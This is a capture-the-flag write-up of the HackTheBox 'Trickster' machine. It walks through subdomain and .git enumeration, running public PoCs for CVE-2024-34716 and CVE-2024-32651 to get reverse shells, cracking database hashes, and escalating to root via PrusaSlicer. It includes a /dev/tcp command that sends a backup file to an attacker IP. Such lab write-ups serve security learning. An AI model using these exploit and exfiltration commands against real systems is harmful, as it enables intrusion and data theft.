---
date: 2025-01-31T00:00:34-06:00
# description: ""
image: "/images/HTB-Trickster/Trickster.png"
lastmod: 2025-01-31
showTableOfContents: true
tags: ["HackTheBox"]
categories: ["Writeups"]
title: "HTB: Trickster"
showTableOfContents: true
type: "post"
---

* Platform: HackTheBox
* Link: [Trickster](https://app.hackthebox.com/machines/Trickster)
* Level: Medium
* OS: Linux
---

[Read this write up in french](https://scorpiosec.com/fr/posts/htb-trickster/)

Trickster is a multi-step machine beginning with the discovery of a subdomain containing a hidden `.git` directory, running an exploitable version of `PrestaShop`. Gaining initial access (with `CVE-2024-34716`) leads to the retrieval of database credentials from a configuration file, which help us find a user password. 

System enumeration reveals an internal Docker interface with a host running a vulnerable instance of `changedetection.io`, which, when exploited (with `CVE-2024-32651`), provides root access within the container. Inside, we obtain backup files containing credentials which we use to pivot to another user. The final privilege escalation to root is achieved by exploiting `PrusaSlicer`.

Target IP - `10.10.11.34`

## Scanning

```
nmap -sC -sV -Pn -oA nmap/Trickster 10.10.11.34
```

**Results**

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-30 14:22 CST
Nmap scan report for 10.10.11.34
Host is up (0.059s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 8c:01:0e:7b:b4:da:b7:2f:bb:2f:d3:a3:8c:a6:6d:87 (ECDSA)
|_  256 90:c6:f3:d8:3f:96:99:94:69:fe:d3:72:cb:fe:6c:c5 (ED25519)

80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://trickster.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: _; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.91 seconds
```

We find two open ports:
* 22 with SSH
* 80 with http, plus a redirection to `trickster.htb`

```
sudo echo "10.10.11.34 trickster.htb" | sudo tee -a /etc/hosts
```

## Enumeration

At `http://trickster.htb/` we find a static website.

![Trickster website](/images/HTB-Trickster/trickster_website.png)

We enumerate for subdomians.
```
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --fc 404 -t 100 -u http://trickster.htb -H "Host: FUZZ.trickster.htb" -ic
```

![subdomain enumeration](/images/HTB-Trickster/trickster_ffuf.png)

Most results have a `301` status (they are all false positive), we can filter them out by updating the command.

```
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --fc 404,301 -t 100 -u http://trickster.htb -H "Host: FUZZ.trickster.htb" -ic
```

![subdomain enumeration filtered](/images/HTB-Trickster/trickster_ffuf2.png)

We discover the `shop` subdomain.

At `http://shop.trickster.htb/` we find an online store.

![store subdomain](/images/HTB-Trickster/trickster_store.png)

The website is using [PrestaShop](https://www.prestashop-project.org/), an open source software platform to build e-commerce solutions.

![Wappalyzer](/images/HTB-Trickster/trickster_prestashop.png)

> I found a few CVEs for Prestashop such as [CVE-2021-3110](https://pentest-tools.com/vulnerabilities-exploits/prestashop-1770-sql-injection_2545) and [CVE-2022-31101](https://www.exploit-db.com/exploits/51001) but none of them worked on the target.

With directory enumeration we find a `.git` directory on the subdomain.

```
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -u http://shop.trickster.htb/FUZZ -ic -fs 283
```

![.git directory](/images/HTB-Trickster/ffuf_trickster_git.png)

We can access it via the browser at `http://shop.trickster.htb/.git/`.

![.git directory content](/images/HTB-Trickster/git_content.png)

We use [git-dumper](https://github.com/arthaud/git-dumper) to dump the repository on our local machine.

```
git-dumper http://shop.trickster.htb/.git/ git_trickster
```

![.git directory download](/images/HTB-Trickster/git_dumper.png)

We have two directories: `.git` (the one we already know about) and `admin634ewutrx1jgitlooaj`. We also check the commits with `git log` and find only one about updating an admin panel by `adam@tricksterhtb`.

![git log command](/images/HTB-Trickster/adam_commit.png)

At `http://shop.trckster.htb/admin634ewutrx1jgitlooaj/` there is another login page with `PrestSahop 8.1.5`.

![prestashop 8.1.5](/images/HTB-Trickster/prestashop_8.1.5.png)

## Initial Foothold

After researching an exploit for this version we find an article [here](https://ayoubmokhtar.com/post/png_driven_chain_xss_to_remote_code_execution_prestashop_8.1.5_cve-2024-34716/) about `CVE-2024-34716` and a PoC is available at [this](https://github.com/aelmokhtar/CVE-2024-34716) Github repository.

We need to set a web server on port 5000 first.

```
python3 -m http.server 5000
```

![web server trickster exploit](/images/HTB-Trickster/web_server_trickster.png)

Then we run the exploit.

```
python3 exploit.py --url http://shop.trickster.htb --email adam@trickster.htb --local-ip YOUR_IP --admin-path admin634ewutrx1jgitlooaj
```

We obtain a shell as `www-data`.

![foothold](/images/HTB-Trickster/foothold.png)

On [this website](https://classydevs.com/prestashop-database-config-file/) we learn the Prestashop database configuration file is either in `your-website/config/settings.inc.php` (for v1.5-1.6) or in `your-website/app/config/parameters.php` (for v1.7). 

In `/var/www/prestashop/config/config.inc.php` we find a line pointing to `parameters.php`.

![configuration file](/images/HTB-Trickster/config_file.png)

### Shell as james

Inside `/var/www/prestashop/app/config/parameters.php` we discover database credentials.

```
ps_user:prest@shop_o
```

![foothold](/images/HTB-Trickster/database_creds.png)

We log into the MySQL database.

```
mysql -u ps_user -p
```

Using the `DESCRIBE` command we inspect the tables, `ps_employee` has some good information.

```SQL
DESCRIBE table_name;
```

![ps_employee columns](/images/HTB-Trickster/ps_employee_fields.png)

We find the password hashes.

```SQL
select lastname, firstname, email, passwd from ps_employee
```

![password hashes](/images/HTB-Trickster/mysql_creds.png)

We crack `james` hash with hashcat and recover the password `alwaysandforever`.

```
hashcat -m 3200 -a 0 james_hash.txt /usr/share/wordlists/rockyou.txt
```

![james password cracked](/images/HTB-Trickster/james_pwd.png)

We login as `james` via SSH and recover the user flag.

![user flag found](/images/HTB-Trickster/user_flag.png)

Linpeas shows that Docker is running.

![Docker found running](/images/HTB-Trickster/docker_present.png)

With `ip a` we find an internal Docker interface (`docker0`) with an IP address of `172.17.0.1` and a subnet of `172.17.0.0/16`.

![Internal docker subnet](/images/HTB-Trickster/docker_network.png)

We scan this network to find its hosts. The nmap binary is available [here](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap).

```
./nmap -sn 172.17.0.0/16
```

![Internal nmap scan](/images/HTB-Trickster/internal_nmap_scan.png)

We find two hosts: `172.17.0.1` (that's us) and `172.17.0.2`, let's scan it.

```
./nmap -p- 172.17.0.2
```

We find port `5000` open. 

![Open ports on 172.17.0.2](/images/HTB-Trickster/port_5000_open.png)

We do some tunneling to access the port.

```
ssh -L PORT_NUMBER:172.17.0.2:5000 james@trickster.htb
```

![SSH tunneling command](/images/HTB-Trickster/SSH_tunneling.png)

At `http://localhost:5000/` we find an instance of [changedetection.io](https://changedetection.io/), a tool to monitor changes in web pages. We login with `james` password, the application is running version `v0.45.20`.

![changedetection version](/images/HTB-Trickster/changedetection_version.png)

### Shell as root (Docker)

After some research we find [CVE-2024-32651](https://www.hacktivesecurity.com/blog/2024/05/08/cve-2024-32651-server-side-template-injection-changedetection-io/) with a PoC [here](https://github.com/evgeni-semenov/CVE-2024-32651). We execute the exploit and become root in the container.

```
python3 cve-2024-32651.py --url http://localhost:5000/ --ip YOUR_IP --port 9001 --password alwaysandforever
```

![cve-2024-32651](/images/HTB-Trickster/CVE_2024_32651.png)

In `/datastore/Backups` we find some zip files.

![backups archives](/images/HTB-Trickster/backup_archives.png)

The container does not have `curl`, `wget`, or `nc`. So we send the data to `/dev/tcp` for file transfer.

On the target we run:

```
cat changedetection-backup-20240830194841.zip > /dev/tcp/YOUR_IP/PORT_NUMBER
```

On our local machine we run:

```
nc -l -p {PORT_NUMBER} -q 1 > changedetection-backup-20240830194841.zip
```

After the extraction we have a directory and a few files.

![extracted files](/images/HTB-Trickster/backup_extracted_files.png)

Inside the directory there are two files, one has the `.br` extension. 

> A file with a .br extension is a Brotli-compressed file. Brotli is a lossless compression algorithm developed by Google, mainly used for compressing web assets like CSS, JavaScript, and HTML to improve website loading speed. _Read more about it [here](https://docs.fileformat.com/web/br/)._

![files found in archive](/images/HTB-Trickster/files_found.png)

### Shell as adam

We decompress the file with `brotli` and get a file called `f04f0732f120c0cc84a993ad99decb2c.txt`.

```
brotli -d f04f0732f120c0cc84a993ad99decb2c.txt.br
```

![brotli decompressed file](/images/HTB-Trickster/brotli_decompress.png)

It contains the credentials `adam:adam_admin992`.

![credentials in decompressed file](/images/HTB-Trickster/creds_brotli.png)

We use them to login as `adam` via SSH. This user can execute `/opt/PrusaSlicer/prusaslicer` as root.

### Shell as root

![Adam SSH login](/images/HTB-Trickster/adam_SSH_login.png)

A privilege escaltion method is available [here](https://github.com/suce0155/prusaslicer_exploit).

```
sudo /opt/PrusaSlicer/prusaslicer -s evil.3mf
```

![prusaslicer privilege escalation](/images/HTB-Trickster/prusaslicer_privesc.png)

On the listener, we get a connection as `root`.

![root flag](/images/HTB-Trickster/root_flag.png)









